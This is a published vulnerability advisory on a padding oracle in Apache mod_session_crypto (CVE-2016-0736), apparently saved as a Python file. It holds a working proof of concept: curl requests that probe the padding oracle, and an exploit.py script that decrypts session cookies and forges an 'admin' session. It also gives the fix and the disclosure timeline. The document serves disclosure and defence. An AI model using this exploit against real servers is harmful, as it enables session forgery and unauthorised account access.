'''
Advisory: Padding Oracle in Apache mod_session_crypto

During a penetration test, RedTeam Pentesting discovered a Padding
Oracle vulnerability in mod_session_crypto of the Apache web server.
This vulnerability can be exploited to decrypt the session data and even
encrypt attacker-specified data.


Details
=======

Product: Apache HTTP Server mod_session_crypto
Affected Versions: 2.3 to 2.5
Fixed Versions: 2.4.25
Vulnerability Type: Padding Oracle
Security Risk: high
Vendor URL: https://httpd.apache.org/docs/trunk/mod/mod_session_crypto.html
Vendor Status: fixed version released
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2016-001.txt
Advisory Status: published
CVE: CVE-2016-0736
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0736


Introduction
============

The module mod_session_crypto of the Apache HTTP Server can be used in
conjunction with the modules mod_session and mod_session_cookie to store
session data in an encrypted cookie within the users' browsers. This
avoids server-side session state so that incoming HTTP requests can be
easily distributed amongst a number of application web servers which do
not need to share session state.


More Details
============

The module mod_session_crypto uses symmetric cryptography to encrypt and
decrypt session data and uses mod_session to store the encrypted data in
a cookie (usually called "session") within the user's browser. The
decrypted session is then made available to the application in an
environment variable (in case of a CGI script) or in a custom HTTP
request header. The application can add a custom HTTP response header
(usually "X-Replace-Session") which instructs the HTTP server to replace
the session's content with the value of the header. Detailed
instructions to set up mod_session and mod_session_crypto can be found
in the documentation:
https://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples

The module mod_session_crypto is configured to use either 3DES or AES
with various key sizes, defaulting to AES256. Encryption is handled by
the function "encrypt_string":

modules/session/mod_session_crypto.c
------------------------------------------------------------------------
/**
 * Encrypt the string given as per the current config.
 *
 * Returns APR_SUCCESS if successful.
 */
static apr_status_t encrypt_string(request_rec * r, const apr_crypto_t *f,
        session_crypto_dir_conf *dconf, const char *in, char **out)
{
[...]
    apr_crypto_key_t *key = NULL;
[...]
    const unsigned char *iv = NULL;
[...]

    /* use a uuid as a salt value, and prepend it to our result */
    apr_uuid_get(&salt);

[...]

    res = apr_crypto_passphrase(&key, &ivSize, passphrase,
            strlen(passphrase),
            (unsigned char *) (&salt), sizeof(apr_uuid_t),
            *cipher, APR_MODE_CBC, 1, 4096, f, r->pool);

[...]

    res = apr_crypto_block_encrypt_init(&block, &iv, key, &blockSize, r->pool);
[...]
    res = apr_crypto_block_encrypt(&encrypt, &encryptlen, (unsigned char *)in,
            strlen(in), block);
[...]
    res = apr_crypto_block_encrypt_finish(encrypt + encryptlen, &tlen, block);
[...]

    /* prepend the salt and the iv to the result */
    combined = apr_palloc(r->pool, ivSize + encryptlen + sizeof(apr_uuid_t));
    memcpy(combined, &salt, sizeof(apr_uuid_t));
    memcpy(combined + sizeof(apr_uuid_t), iv, ivSize);
    memcpy(combined + sizeof(apr_uuid_t) + ivSize, encrypt, encryptlen);

    /* base64 encode the result */
    base64 = apr_palloc(r->pool, apr_base64_encode_len(ivSize + encryptlen +
                    sizeof(apr_uuid_t) + 1)
            * sizeof(char));
[...]
    return res;
}
------------------------------------------------------------------------

The source code shows that an encryption key is derived from the
configured password and a randomly chosen salt by calling the function
"apr_crypto_passphrase". This function internally uses PBKDF2 to derive
the key. The data is then encrypted and the salt and IV prepended to the
encrypted data. Before returning to the caller, the result is encoded as
base64.

This procedure does not guarantee integrity of the ciphertext, so the
Apache module is unable to detect whether a session sent back to the
server has been tampered with. Depending on the application this often
means that attackers are able to exploit a Padding Oracle vulnerability.
This allows decrypting the session and encrypting arbitrary data chosen
by the attacker.


Proof of Concept
================

The vulnerability can be reproduced as follows. First, the modules
mod_session, mod_session_crypto and mod_session_cookie are enabled and
configured:

------------------------------------------------------------------------
Session On
SessionEnv On
SessionCookieName session path=/
SessionHeader X-Replace-Session
SessionCryptoPassphrase RedTeam
------------------------------------------------------------------------

In addition, CGI scripts are enabled for a folder and the following CGI
script is saved as "status.rb" and is made available to clients:

------------------------------------------------------------------------
#!/usr/bin/env ruby

require 'cgi'

cgi = CGI.new
data = CGI.parse(ENV['HTTP_SESSION'])

if data.has_key? 'username'
        puts
        puts "your username is %s" % data['username']
        exit
end

puts "X-Replace-Session: username=guest&timestamp=" + Time.now.strftime("%s")
puts
puts "not logged in"
------------------------------------------------------------------------

Once the CGI script is correctly set up, the command-line HTTP client curl
can be used to access it:

------------------------------------------------------------------------
$ curl -i http://127.0.0.1:8080/cgi-bin/status.rb
HTTP/1.1 200 OK
Date: Tue, 19 Jan 2016 13:23:19 GMT
Server: Apache/2.4.10 (Ubuntu)
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Cache-Control: no-cache
Set-Cookie: session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vpLQ
   l1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=;path=/
Transfer-Encoding: chunked
Content-Type: application/x-ruby

not logged in
------------------------------------------------------------------------

The example shows that a new encrypted cookie with the name "session" is
returned, and the response body contains the text "not logged in".
Calling the script again with the cookie just returned reveals that the
username in the session is set to "guest":

------------------------------------------------------------------------
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU= \
http://127.0.0.1:8080/cgi-bin/status.rb

your username is guest
------------------------------------------------------------------------

Sending a modified cookie ending in "u=" instead of "U=" will invalidate
the padding at the end of the ciphertext, so the session cannot be
decrypted correctly and is therefore not passed to the CGI script, which
returns the text "not logged in" again:

------------------------------------------------------------------------
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4Hztmf0CFsp1vp\
LQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRu= \
http://127.0.0.1:8080/cgi-bin/status.rb

not logged in
------------------------------------------------------------------------

This verifies the existence of the Padding Oracle vulnerability. The
Python library[1] python-paddingoracle was then used to implement
decrypting the session by exploiting the Padding Oracle vulnerability.

exploit.py
------------------------------------------------------------------------
'''

from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b64encode, b64decode
import requests

class PadBuster(PaddingOracle):
    def __init__(self, valid_cookie, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.wait = kwargs.get('wait', 2.0)
        self.valid_cookie = valid_cookie

    def oracle(self, data, **kwargs):
        v = b64encode(self.valid_cookie+data)

        response = requests.get('http://127.0.0.1:8080/cgi-bin/status.rb',
                cookies=dict(session=v), stream=False, timeout=5, verify=False)

        if 'username' in response.content:
            logging.debug('No padding exception raised on %r', v)
            return

        raise BadPaddingException

if __name__ == '__main__':
    import logging
    import sys

    if not sys.argv[2:]:
        print 'Usage: [encrypt|decrypt] <session value> <plaintext>'
        sys.exit(1)

    logging.basicConfig(level=logging.WARN)
    mode = sys.argv[1]
    session = b64decode(sys.argv[2])
    padbuster = PadBuster(session)

    if mode == "decrypt":
        cookie = padbuster.decrypt(session[32:], block_size=16, iv=session[16:32])
        print('Decrypted session:\n%r' % cookie)
    elif mode == "encrypt":
        key = session[0:16]
        plaintext = sys.argv[3]

        s = padbuster.encrypt(plaintext, block_size=16)

        data = b64encode(key+s[0:len(s)-16])
        print('Encrypted session:\n%s' % data)
    else:
        print "invalid mode"
        sys.exit(1)

'''
------------------------------------------------------------------------

This Python script can then be used to decrypt the session:

------------------------------------------------------------------------
$ time python exploit.py decrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYBRU=
Decrypted session:
b'username=guest&timestamp=1453282205\r\r\r\r\r\r\r\r\r\r\r\r\r'

real    6m43.088s
user    0m15.464s
sys 0m0.976s
------------------------------------------------------------------------

In this sample application, the username and a timestamp are included in
the session data. The Python script can also be used to encrypt a new
session containing the username "admin":

------------------------------------------------------------------------
$ time python exploit.py encrypt sxGTJsP1TqiPrbKVM1GAXHla5xSbA/u4zH/4\
Hztmf0CFsp1vpLQl1DGPGMMyujJL/znsBkkf0f8cXLgNDgsGE9O7pbWnbaJS8JEKXZMYB\
RU= username=admin

Encrypted session:
sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7zmQ/GLFjF4pcXY

real3m38.002s
users0m8.536s
sys0m0.512s

------------------------------------------------------------------------

Sending this newly encrypted session to the server shows that the
username is now "admin":

------------------------------------------------------------------------
$ curl -b session=sxGTJsP1TqiPrbKVM1GAXPZQZNxCxjK938K9tufqX9xDLFciz7\
zmQ/GLFjF4pcXY http://127.0.0.1:8080/cgi-bin/status.rb

your username is admin
------------------------------------------------------------------------


Workaround
==========

Use a different means to store the session, e.g. in a database by using
mod_session_dbd.


Fix
===

Update to Apache HTTP version 2.4.25 (see [2]).


Security Risk
=============

Applications which use mod_session_crypto usually store sensitive values
in the session and rely on an attacker's inability to decrypt or modify
the session. Successful exploitation of the Padding Oracle vulnerability
subverts this mechanism and allows to construct sessions with arbitrary
attacker-specified content. Depending on the application this may
completely subvert the application's security. Therefore, this
vulnerability poses a high risk.


Timeline
========

2016-01-11 Vulnerability identified
2016-01-12 Customer approved disclosure to vendor
2016-01-12 CVE number requested
2016-01-20 Vendor notified
2016-01-22 Vendor confirmed the vulnerability
2016-02-03 Vendor provided patch
2016-02-04 Apache Security Team assigned CVE number
2016-03-03 Requested status update from vendor, no response
2016-05-02 Requested status update from vendor, no response
2016-07-14 Requested status update and roadmap from vendor
2016-07-21 Vendor confirms working on a new released and inquired whether the
           patch fixes the vulnerability
2016-07-22 RedTeam confirms
2016-08-24 Requested status update from vendor
2016-08-29 Vendor states that there is no concrete timeline
2016-12-05 Vendor announces a release
2016-12-20 Vendor released fixed version
2016-12-23 Advisory released


References
==========

[1] https://github.com/mwielgoszewski/python-paddingoracle
[2] http://httpd.apache.org/security/vulnerabilities_24.html


RedTeam Pentesting GmbH
=======================

RedTeam Pentesting offers individual penetration tests performed by a
team of specialised IT-security experts. Hereby, security weaknesses in
company networks or products are uncovered and can be fixed immediately.

As there are only few experts in this field, RedTeam Pentesting wants to
share its knowledge and enhance the public knowledge with research in
security-related areas. The results are made available as public
security advisories.

More information about RedTeam Pentesting can be found at:
https://www.redteam-pentesting.de/
'''